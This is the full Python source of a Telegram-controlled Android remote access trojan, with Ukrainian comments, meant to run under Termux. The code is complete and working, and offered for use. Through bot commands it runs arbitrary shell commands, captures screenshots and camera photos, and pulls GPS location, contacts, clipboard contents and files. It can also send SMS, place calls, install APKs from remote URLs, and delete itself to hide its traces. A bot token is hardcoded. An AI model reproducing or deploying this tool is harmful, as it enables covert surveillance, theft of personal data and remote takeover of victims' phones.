#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroidRAT-Termux v1.0
Автор: Nektiq Team
Мова: Python 3.9+ (Termux)
Призначення: Remote Administration Tool для Android-пристроїв через Телеграм-бот
Вимоги (автоматично встановлюються скриптом install_and_run.sh):
- python
- python-telegram-bot
- termux-api
"""

import os
import sys
import subprocess
import shutil
import tempfile
import threading
import time
import json
from pathlib import Path

from telegram import Update, InputFile, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    filters,
)

# ----------------------------------------
# КОНСТАНТИ ТА ГЛОБАЛИ
# ----------------------------------------

# ВАШ ТОКЕН: вставте сюди токен вашого Telegram-бота
TELEGRAM_TOKEN = "7518266837:AAHu43-Y9pTzZ_ETwa1lwzL1GVecghbeWMw"

# Каталог для тимчасових файлів (скриншоти, фото тощо)
TMP_DIR = tempfile.gettempdir()
LOG_DIR = os.path.join(Path.home(), ".android_rat", "logs")
os.makedirs(LOG_DIR, exist_ok=True)

# ----------------------------------------
# Допоміжні функції
# ----------------------------------------

def run_shell(command: str) -> str:
    """
    Виконує довільну shell-команду через subprocess і повертає stdout+stderr.
    """
    try:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = proc.stdout + proc.stderr
        return output if output.strip() else "(немає виводу)"
    except subprocess.TimeoutExpired:
        return "❌ Таймаут: команда виконувалася більше 60 сек."
    except Exception as e:
        return f"❌ Помилка виконання shell: {e}"


def termux_api_exec(cmd: list) -> str:
    """
    Виконує команду termux-api через subprocess та повертає результат.
    """
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        result = proc.stdout + proc.stderr
        return result if result.strip() else "(немає виводу)"
    except Exception as e:
        return f"❌ Помилка termux-api: {e}"


# ----------------------------------------
# ОБРОБНИКИ КОМАНД
# ----------------------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Обробник для /start: виводить клавіатуру з основними командами.
    """
    keyboard = [
        [KeyboardButton("/shell "), KeyboardButton("/screenshot")],
        [KeyboardButton("/camera"), KeyboardButton("/location")],
        [KeyboardButton("/battery"), KeyboardButton("/contacts")],
        [KeyboardButton("/sms_send "), KeyboardButton("/call ")],
        [KeyboardButton("/file_list "), KeyboardButton("/file_download ")],
        [KeyboardButton("/file_remove "), KeyboardButton("/file_upload")],
        [KeyboardButton("/app_list"), KeyboardButton("/install_apk ")],
        [KeyboardButton("/uninstall_apk "), KeyboardButton("/clipboard_get")],
        [KeyboardButton("/clipboard_set "), KeyboardButton("/sensor ")],
        [KeyboardButton("/self_destruct")],
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🚀 AndroidRAT-Termux\nОберіть команду або введіть у чат:", reply_markup=reply_markup
    )


async def shell_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /shell <команда> — Виконує shell-команду на Android.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /shell <команда>")
        return
    cmd = parts[1]
    await update.message.reply_text(f"✅ Виконую: <code>{cmd}</code>", parse_mode="HTML")
    out = run_shell(cmd)
    for i in range(0, len(out), 3000):
        await update.message.reply_text(f"<pre>{out[i:i+3000]}</pre>", parse_mode="HTML")


async def screenshot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /screenshot — Зробити скриншот екрану через termux-screenshot.
    """
    filename = f"screenshot_{int(time.time())}.png"
    filepath = os.path.join(TMP_DIR, filename)
    cmd = ["termux-screenshot", "-p", filepath]
    result = termux_api_exec(cmd)
    if os.path.isfile(filepath):
        try:
            await update.message.reply_photo(photo=InputFile(filepath))
        except Exception as e:
            await update.message.reply_text(f"❌ Помилка відправки: {e}")
        finally:
            os.remove(filepath)
    else:
        await update.message.reply_text(f"❌ Не вдалося зробити скриншот:\n{result}")


async def camera_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /camera — Зробити фото з основної камери через termux-camera-photo.
    """
    filename = f"camera_{int(time.time())}.jpg"
    filepath = os.path.join(TMP_DIR, filename)
    cmd = ["termux-camera-photo", "-c", "0", filepath]
    result = termux_api_exec(cmd)
    if os.path.isfile(filepath):
        try:
            await update.message.reply_photo(photo=InputFile(filepath))
        except Exception as e:
            await update.message.reply_text(f"❌ Помилка відправки: {e}")
        finally:
            os.remove(filepath)
    else:
        await update.message.reply_text(f"❌ Не вдалося зробити фото:\n{result}")


async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /location — Отримати поточне місцеположення через termux-location.
    """
    cmd = ["termux-location", "-p", "gps"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        lat = data.get("latitude", "N/A")
        lon = data.get("longitude", "N/A")
        acc = data.get("accuracy", "N/A")
        await update.message.reply_text(f"📍 Широта: <b>{lat}</b>\n📍 Довгота: <b>{lon}</b>\nТочність: {acc} м", parse_mode="HTML")
    except Exception:
        await update.message.reply_text(f"❌ Не вдалося отримати локацію:\n{result}")


async def battery_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /battery — Отримати статус акумулятора через termux-battery-status.
    """
    cmd = ["termux-battery-status"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        health = data.get("health", "N/A")
        level = data.get("percentage", "N/A")
        status = data.get("status", "N/A")
        temp = data.get("temperature", "N/A")
        await update.message.reply_text(
            f"🔋 Статус: <b>{status}</b>\n"
            f"💯 Рівень: <b>{level}%</b>\n"
            f"❤ Стан здоров'я: <b>{health}</b>\n"
            f"🌡 Температура: {temp/10:.1f}°C",
            parse_mode="HTML"
        )
    except Exception:
        await update.message.reply_text(f"❌ Не вдалося отримати статус акумулятора:\n{result}")


async def contacts_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /contacts — Перелік контактів через termux-contacts-list.
    """
    cmd = ["termux-contacts-list"]
    result = termux_api_exec(cmd)
    try:
        data = json.loads(result)
        lines = []
        for person in data:
            name = person.get("name", "N/A")
            numbers = person.get("numbers", [])
            nums = ", ".join(n.get("number", "") for n in numbers)
            lines.append(f"👤 {name}: {nums}")
        text = "\n".join(lines[:50]) + ("\n... (щe контакти)" if len(lines) > 50 else "")
        await update.message.reply_text(f"<pre>{text}</pre>", parse_mode="HTML")
    except Exception:
        await update.message.reply_text(f"❌ Не вдалося отримати контакти:\n{result}")


async def sms_send_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /sms_send <номер> <текст> — Надіслати SMS через termux-sms-send.
    """
    text = update.message.text
    parts = text.split(" ", 2)
    if len(parts) < 3:
        await update.message.reply_text("❌ Формат: /sms_send <номер> <текст>")
        return
    number = parts[1]
    message = parts[2]
    cmd = ["termux-sms-send", "-n", number, message]
    _ = termux_api_exec(cmd)
    await update.message.reply_text(f"✅ SMS надіслано до {number}:\n{message}")


async def call_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /call <номер> — Ініціювати дзвінок через termux-telephony-call.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /call <номер>")
        return
    number = parts[1]
    cmd = ["termux-telephony-call", number]
    _ = termux_api_exec(cmd)
    await update.message.reply_text(f"📞 Дзвінок ініційовано: {number}")


async def file_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_list <шлях> — Лістинг каталогу.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /file_list <шлях>")
        return
    path = parts[1]
    if not os.path.isdir(path):
        await update.message.reply_text("❌ Це не директорія або не існує.")
        return
    items = os.listdir(path)
    lines = []
    for name in items:
        full = os.path.join(path, name)
        try:
            mtime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(os.path.getmtime(full)))
        except:
            mtime = "N/A"
        if os.path.isdir(full):
            typ = "<DIR>"
            size = "-"
        else:
            typ = "FILE"
            try:
                size = os.path.getsize(full)
            except:
                size = "-"
        lines.append(f"{typ}\t{size}\t{mtime}\t{name}")
    text_out = "\n".join(lines[:50]) + ("\n... (щe елементи)" if len(lines) > 50 else "")
    await update.message.reply_text(f"<pre>{text_out}</pre>", parse_mode="HTML")


async def file_download_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_download <шлях> — Відправити файл через бот.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /file_download <шлях>")
        return
    path = parts[1]
    if not os.path.isfile(path):
        await update.message.reply_text("❌ Файл не існує.")
        return
    try:
        await update.message.reply_document(document=InputFile(path))
    except Exception as e:
        await update.message.reply_text(f"❌ Помилка відправки: {e}")


async def file_remove_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_remove <шлях> — Видалити файл/теку.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /file_remove <шлях>")
        return
    path = parts[1]
    if not os.path.exists(path):
        await update.message.reply_text("❌ Шлях не існує.")
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
            await update.message.reply_text(f"✅ Директорію видалено: {path}")
        else:
            os.remove(path)
            await update.message.reply_text(f"✅ Файл видалено: {path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Помилка видалення: {e}")


async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /file_upload — Очікуємо файл від користувача для збереження на пристрої.
    """
    await update.message.reply_text("🚀 Надішліть файл, який потрібно зберегти на пристрої.")


async def file_upload_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Обробляє документ, завантажений користувачем, зберігає у поточній робочій директорії.
    """
    if update.message.document:
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
        dest = os.path.join(Path.home(), filename)
        try:
            await file.download_to_drive(dest)
            await update.message.reply_text(f"✅ Файл збережено: {dest}")
        except Exception as e:
            await update.message.reply_text(f"❌ Помилка збереження: {e}")
    else:
        await update.message.reply_text("❌ Це не файл.")


async def app_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /app_list — Показати перелік встановлених додатків (pm list packages).
    """
    cmd = "pm list packages"
    out = run_shell(cmd)
    lines = out.splitlines()
    text_out = "\n".join(lines[:50]) + ("\n... (щe пакети)" if len(lines) > 50 else "")
    await update.message.reply_text(f"<pre>{text_out}</pre>", parse_mode="HTML")


async def install_apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /install_apk <URL> — Завантажити APK із URL та встановити через pm install.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /install_apk <URL>")
        return
    url = parts[1]
    local_name = os.path.join(TMP_DIR, f"apk_{int(time.time())}.apk")
    wget_cmd = f"wget -q -O \"{local_name}\" \"{url}\""
    dl_res = run_shell(wget_cmd)
    if not os.path.isfile(local_name):
        await update.message.reply_text(f"❌ Не вдалося завантажити APK:\n{dl_res}")
        return
    install_cmd = f"pm install -r \"{local_name}\""
    out = run_shell(install_cmd)
    await update.message.reply_text(f"✅ Встановлення APK:\n<pre>{out}</pre>", parse_mode="HTML")
    os.remove(local_name)


async def uninstall_apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /uninstall_apk <package> — Видалити додаток через pm uninstall.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /uninstall_apk <package>")
        return
    pkg = parts[1]
    cmd = f"pm uninstall \"{pkg}\""
    out = run_shell(cmd)
    await update.message.reply_text(f"✅ Видалення пакету {pkg}:\n<pre>{out}</pre>", parse_mode="HTML")


async def clipboard_get_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clipboard_get — Отримати вміст буфера обміну (termux-clipboard-get).
    """
    cmd = ["termux-clipboard-get"]
    result = termux_api_exec(cmd)
    await update.message.reply_text(f"📋 Буфер обміну:\n<pre>{result}</pre>", parse_mode="HTML")


async def clipboard_set_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clipboard_set <текст> — Встановити вміст буфера обміну (termux-clipboard-set).
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /clipboard_set <текст>")
        return
    clip_text = parts[1]
    cmd = ["termux-clipboard-set", clip_text]
    termux_api_exec(cmd)
    await update.message.reply_text("✅ Буфер обміну оновлено.")


async def sensor_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /sensor <тип> — Отримати дані сенсора: temperature, light, accelerometer.
    """
    text = update.message.text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        await update.message.reply_text("❌ Формат: /sensor <temperature|light|accelerometer>")
        return
    stype = parts[1].lower()
    if stype == "temperature":
        cmd = ["termux-sensor", "-s", "temperature"]
    elif stype == "light":
        cmd = ["termux-sensor", "-s", "light"]
    elif stype == "accelerometer":
        cmd = ["termux-sensor", "-s", "accelerometer"]
    else:
        await update.message.reply_text("❌ Невідомий тип сенсора.")
        return
    result = termux_api_exec(cmd)
    await update.message.reply_text(f"🔍 Дані сенсора ({stype}):\n<pre>{result}</pre>", parse_mode="HTML")


async def self_destruct_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /self_destruct — Видалити скрипт та логи.
    """
    await update.message.reply_text("⚠️ Самознищення запущено. Видаляємо скрипт та логи...")
    script = os.path.abspath(sys.argv[0])
    try:
        for f in os.listdir(LOG_DIR):
            fp = os.path.join(LOG_DIR, f)
            if os.path.isfile(fp):
                os.remove(fp)
        shutil.rmtree(os.path.dirname(script), ignore_errors=True)
    except:
        pass
    try:
        os.remove(script)
    except:
        pass
    sys.exit(0)


# ----------------------------------------
# ГОЛОВНА ФУНКЦІЯ
# ----------------------------------------

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # Команди
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("shell", shell_handler))
    app.add_handler(CommandHandler("screenshot", screenshot_handler))
    app.add_handler(CommandHandler("camera", camera_handler))
    app.add_handler(CommandHandler("location", location_handler))
    app.add_handler(CommandHandler("battery", battery_handler))
    app.add_handler(CommandHandler("contacts", contacts_handler))
    app.add_handler(CommandHandler("sms_send", sms_send_handler))
    app.add_handler(CommandHandler("call", call_handler))
    app.add_handler(CommandHandler("file_list", file_list_handler))
    app.add_handler(CommandHandler("file_download", file_download_handler))
    app.add_handler(CommandHandler("file_remove", file_remove_handler))
    app.add_handler(CommandHandler("file_upload", file_upload_handler))
    app.add_handler(MessageHandler(filters.Document.ALL & filters.User(), file_upload_received))
    app.add_handler(CommandHandler("app_list", app_list_handler))
    app.add_handler(CommandHandler("install_apk", install_apk_handler))
    app.add_handler(CommandHandler("uninstall_apk", uninstall_apk_handler))
    app.add_handler(CommandHandler("clipboard_get", clipboard_get_handler))
    app.add_handler(CommandHandler("clipboard_set", clipboard_set_handler))
    app.add_handler(CommandHandler("sensor", sensor_handler))
    app.add_handler(CommandHandler("self_destruct", self_destruct_handler))

    print("🤖 AndroidRAT-Termux запущено. Чекаємо команд від Телеграм...")
    app.run_polling()


if __name__ == "__main__":
    main()
